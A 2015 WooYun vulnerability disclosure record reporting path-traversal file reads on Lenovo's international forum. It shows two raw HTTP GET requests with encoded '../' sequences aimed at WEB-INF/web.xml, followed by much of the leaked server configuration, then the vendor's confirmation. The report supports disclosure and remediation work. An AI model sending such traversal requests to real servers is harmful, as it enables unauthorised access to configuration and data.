{"id": 44228, "wybug_id": "wooyun-2015-0101549", "wybug_title": "联想某国际业务任意文件读取打包", "wybug_corp": "联想", "wybug_author": "路人甲", "wybug_date": "2015-03-16 09:48", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-30：\t细节向公众公开  简要描述：  详细说明：  国际论坛forums.lenovo.com.两处打包\nGET /lnv/?category.id=..%2f..%2f..%2fWEB-INF%2fweb.xml%3bx%3d HTTP/1.1User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-us,en;q=0.8,en-us,en;q=0.5Cache-Control: no-cacheHost: forums.lenovo.com.Accept-Encoding: gzip, deflate\n\nGET /lnv/board/message?board.id=..%2f..%2f..%2fWEB-INF%2fweb.xml%3bx%3d&thread.id=1 HTTP/1.1Referer: http://forums.lenovo.com./Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) Cache-Control: no-cacheAccept-Language: en-us,en;q=0.5Host: forums.lenovo.com.Accept-Encoding: gzip, deflate\n\nContent-Length: 16894Connection: closeContent-Type: text/xml;charset=UTF-8<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><web-app xmlns=\"http://java.sun.com/xml/ns/j2ee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\txsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd\"\tversion=\"2.4\">\t<display-name>web2</display-name>\t<session-config>\t\t<session-timeout>30</session-timeout>\t</session-config>\t<context-param>\t\t<param-name>jspellLexicons</param-name>\t\t<param-value>res/jspell/</param-value>\t</context-param>\t<context-param>\t\t<param-name>tapestry.app-package</param-name>\t\t<param-value>lithium.web2</param-value>\t</context-param>\t<listener>\t\t<listener-class>lithium.servlet.session.ApplicationSessionTrackerHttpSessionListener</listener-class>\t\t<listener-class>lithium.reporting.metrics.unique.UniqueMetricProcessorHttpSessionListener</listener-class>\t\t<listener-class>lithium.user.UserSessionListener</listener-class>\t</listener>\t<!-- ================================================================= Filters -->\t<filter>\t\t<filter-name>characterEncodingFilter</filter-name>\t\t<filter-class>lithium.servlet.CharacterEncodingFilter</filter-class>\t</filter>\t<filter>\t\t<filter-name>putTomcatRequestFilter</filter-name>\t\t<filter-class>lithium.servlet.PutTomcatRequestinAttributeFilter</filter-class>\t</filter>\t<filter>\t\t<filter-name>applicationSelectorFilter</filter-name>\t\t<filter-class>lithium.apps.main.container.filters.ApplicationSelectorFilter</filter-class>\t</filter>\t<filter>\t\t<filter-name>clickjackingFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>p3pHeaderFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>clearStateFilter</filter-name>\t\t<filter-class>lithium.boards.servlet.ClearStateFilter</filter-class>\t</filter>\t<filter>\t\t<filter-name>trackingFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t\t<filter>\t\t<filter-name>operationsLoggingFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>blackboxFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>liaTapestryFilter</filter-name>\t\t<filter-class>lithium.web2.services.servlet.LiaTapestryFilter</filter-class>\t</filter>\t<filter>\t\t<filter-name>facebookSignedRequestFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>rewriteFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t\t<init-param>\t\t\t<param-name>targetFilterLifecycle</param-name>\t\t\t<param-value>true</param-value>\t\t</init-param>\t</filter>\t\t<filter>\t\t<filter-name>httpRequestContextFilter</filter-name>\t\t<filter-class>lithium.servlet.HttpRequestContextFilter</filter-class>\t</filter>\t<filter>\t\t<filter-name>agentDetectionFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>sessionIdStripperFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>setHeaderValidationFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>metricsFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>requestTransformFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>replicatedSessionFilter</filter-name>\t\t<filter-class>lithium.servlet.session.ReplicatedSessionFilter</filter-class>\t</filter>\t<filter>\t\t<filter-name>userSessionFilterWeb2</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t\t<filter>\t\t<filter-name>realtimeNotificationAuthFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>visitorFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>bannedUserFilterChainWeb2</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>mimeFilter</filter-name>\t\t<filter-class>lithium.servlet.MimeFilter</filter-class>\t\t<init-param>\t\t\t<param-name>charset.encoding</param-name>\t\t\t<param-value>UTF-8</param-value>\t\t</init-param>\t</filter>\t<filter>\t\t<filter-name>clientDeviceDetectionFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>limitFilterChainWeb2</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>funnelFilterChain</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>pageCacheFilterChain</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>forwardedHeadersFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>canonicalIpFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>vanityHostnameRedirectFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>accessCheckFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>notSecureSessionCookieFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>sipDomainRequestManagerFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<filter>\t\t<filter-name>multipartRequestFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<!--        Adds a non-reversible hashed IP as a request attribute lithium.servlet.HashedIpFilter.HASHED_IP_ATTR.        Must come before maskedIpFilter (so it has access to full IP).    -->    <filter>\t\t<filter-name>hashedIpFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<!--        Masks the IP address (wraps the HttpServletRequest) for anonymous requests.        Adds a boolean request attribute lithium.servlet.MaskedIpFilter.IS_MASKED (\"true\" or \"false\" depending on if        the IP is masked).    -->\t<filter>\t\t<filter-name>maskedIpFilter</filter-name>\t\t<filter-class>lithium.util.http.DelegatingApplicationFilterProxy</filter-class>\t</filter>\t<!-- =================================================================\t\t Filter Mappings\t\t Determines which filters run for given url patterns or servlet names.  \t\t Note that the filters execute in this order.\t-->\t<filter-mapping>\t\t<filter-name>characterEncodingFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>putTomcatRequestFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<!-- \t    applicationSelectorFilter needs to occur before any filter which depends on a specific application context. \t-->\t<filter-mapping>\t\t<filter-name>applicationSelectorFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>ERROR</dispatcher>\t</filter-mapping>\t\t<filter-mapping>\t\t<filter-name>funnelFilterChain</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<!--\t\tThe forwardedHeadersFilter filter needs to be before the canonicalIpFilter filter \t\tsince it modifies the request headers.\t-->\t<filter-mapping>\t\t<filter-name>forwardedHeadersFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<!--\t\tThe canonicalIpFilter filter needs to be before any filter that accesses, logs, or otherwise \t\tuses the remoteAddr from the request.    -->\t<filter-mapping>\t\t<filter-name>canonicalIpFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>vanityHostnameRedirectFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>p3pHeaderFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>accessCheckFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<!-- \t    the notSecureSessionCookieFilter needs to be before the RewriteFilter \t\tand the UserSessionFilter to prevent infinite redirects \t-->\t<filter-mapping>\t\t<filter-name>notSecureSessionCookieFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>sipDomainRequestManagerFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>clearStateFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>trackingFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>operationsLoggingFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t\t<filter-mapping>\t\t<filter-name>blackboxFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t\t<filter-mapping>\t\t<filter-name>facebookSignedRequestFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>rewriteFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>replicatedSessionFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>agentDetectionFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>sessionIdStripperFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>setHeaderValidationFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>metricsFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>requestTransformFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>limitFilterChainWeb2</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>mimeFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>multipartRequestFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>userSessionFilterWeb2</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t\t\t<filter-mapping>\t\t<filter-name>realtimeNotificationAuthFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>visitorFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>bannedUserFilterChainWeb2</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>clientDeviceDetectionFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>pageCacheFilterChain</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>hashedIpFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>maskedIpFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>httpRequestContextFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t\t<dispatcher>ERROR</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>liaTapestryFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t\t<dispatcher>ERROR</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>clickjackingFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t</filter-mapping>\t\t<!-- ================================================================= Servlets -->\t<servlet>\t\t<servlet-name>javaScriptServlet</servlet-name>\t\t<servlet-class>lithium.util.http.DelegatingApplicationServletProxy</servlet-class>\t</servlet>    <servlet>        <servlet-name>cssServlet</servlet-name>        <servlet-class>lithium.util.http.DelegatingApplicationServletProxy</servlet-class>    </servlet>\t<!-- ================================================================= Servlet Mappings -->\t<servlet-mapping>\t\t<servlet-name>javaScriptServlet</servlet-name>\t\t<url-pattern>/scripts/*</url-pattern>\t</servlet-mapping>    <servlet-mapping>        <servlet-name>cssServlet</servlet-name>        <url-pattern>/assets/css/*</url-pattern>    </servlet-mapping>\t<!-- ================================================================= Error Page Mappings -->\t<error-page>\t\t<error-code>404</error-code>\t\t<location>/errors/error404page</location>\t</error-page>\t<!-- ================================================================= Mime Mappings -->\t<mime-mapping>\t\t<extension>html</extension>\t\t<mime-type>text/html</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>css</extension>\t\t<mime-type>text/css</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>js</extension>\t\t<mime-type>text/javascript</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>gif</extension>\t\t<mime-type>image/gif</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>jpg</extension>\t\t<mime-type>image/jpeg</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>png</extension>\t\t<mime-type>image/png</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>bmp</extension>\t\t<mime-type>image/bmp</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>au</extension>\t\t<mime-type>audio/basic</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>jad</extension>\t\t<mime-type>text/vnd.sun.j2me.app-descriptor</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>jar</extension>\t\t<mime-type>application/java-archive</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>cab</extension>\t\t<mime-type>application/java-archive</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>xml</extension>\t\t<mime-type>text/xml</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>txt</extension>\t\t<mime-type>text/plain</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>class</extension>\t\t<mime-type>application/octet-stream</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>cacert</extension>\t\t<mime-type>application/x-x509-ca-cert</mime-type>\t</mime-mapping>。。。。。。。。。。。。。。。。。。。。。。。。。。。。\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-16 15:01 厂商回复： 谢谢您对联想安全工作的支持,我们会尽快修复漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}